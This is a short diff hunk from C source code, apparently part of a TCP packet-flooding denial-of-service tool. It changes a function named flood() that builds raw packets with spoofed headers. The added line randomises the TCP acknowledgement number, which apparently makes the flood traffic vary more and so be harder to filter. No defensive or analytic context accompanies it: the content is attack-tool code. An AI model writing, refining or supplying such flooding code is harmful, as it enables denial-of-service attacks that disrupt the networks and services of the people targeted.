@@ -826,6 +826,7 @@ void *flood(void *par1)
 		iph->check = csum((unsigned short *)datagram, iph->tot_len);
 		tcph->check = 0;
 		tcph->seq = htonl(rand_cmwc() & 0xFFFFFFFFF);
+		tcph->ack_seq = randnum(10000, 99999);
 		tcph->doff = sizeof(struct tcphdr) / 4;
 		tcph->dest = htons(floodport);
 		iph->ttl = randnum(64, 128);
